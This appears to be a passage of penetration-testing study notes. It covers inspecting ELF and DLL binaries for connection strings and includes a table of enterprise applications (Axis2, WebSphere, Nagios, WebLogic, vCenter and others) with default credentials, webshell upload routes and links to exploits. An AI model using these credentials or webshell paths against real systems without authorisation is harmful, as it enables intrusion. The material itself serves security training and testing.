#### ELF Executable Examination

- Debug binaries with **GDB** to reveal database connection strings
```bash
    set disassembly-flavor intel
```

---

#### DLL File Examination

- Examine file metadata
```powershell
    Get-FileMetaData .\MultimasterAPI.dll
```

- Debug with **dnSpy** to uncover connection strings during decompilation

---

### Other Notable Applications

| Application | Abuse Information |
| --- | --- |
| [Axis2](https://axis.apache.org/axis2/java/core/) | Similar to Tomcat. Check for weak/default admin credentials. Upload a [webshell](https://github.com/tennc/webshell/tree/master/other/cat.aar) as an AAR file. Metasploit [module](https://packetstormsecurity.com/files/96224/Axis2-Upload-Exec-via-REST.html) available. |
| [WebSphere](https://en.wikipedia.org/wiki/IBM_WebSphere_Application_Server) | Default credentials `system:manager`. Deploy a WAR file for RCE. Many historical [CVEs](https://www.cvedetails.com/vulnerability-list/vendor_id-14/product_id-576/cvssscoremin-9/cvssscoremax-/IBM-Websphere-Application-Server.html). |
| [Elasticsearch](https://en.wikipedia.org/wiki/Elasticsearch) | Check for [older RCE vulnerabilities](https://www.exploit-db.com/exploits/36337) on forgotten installations. |
| [Zabbix](https://en.wikipedia.org/wiki/Zabbix) | Multiple [CVEs](https://www.cvedetails.com/vulnerability-list/vendor_id-5667/product_id-9588/Zabbix-Zabbix.html) including SQLi, auth bypass, XSS, and RCE via API. |
| [Nagios](https://en.wikipedia.org/wiki/Nagios) | Default credentials: `nagiosadmin:PASSW0RD`. History of RCE, privesc, SQLi, and code injection. |
| [WebLogic](https://en.wikipedia.org/wiki/Oracle_WebLogic_Server) | 190+ CVEs including many unauthenticated RCE (Java deserialization) from 2007–2021. |
| Wikis/Intranets | Search document repositories on MediaWiki, SharePoint, or custom intranets for credentials. |
| [DotNetNuke](https://en.wikipedia.org/wiki/DNN_(software)) | Auth bypass, directory traversal, stored XSS, file upload bypass, arbitrary file download. |
| [vCenter](https://en.wikipedia.org/wiki/VCenter) | Check for weak credentials. Notable vulns: Apache Struts 2 RCE, [OVA file upload](https://www.rapid7.com/db/modules/exploit/multi/http/vmware_vcenter_uploadova_rce/), [CVE-2021-22005](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22005). Often runs as SYSTEM or Domain Admin. |
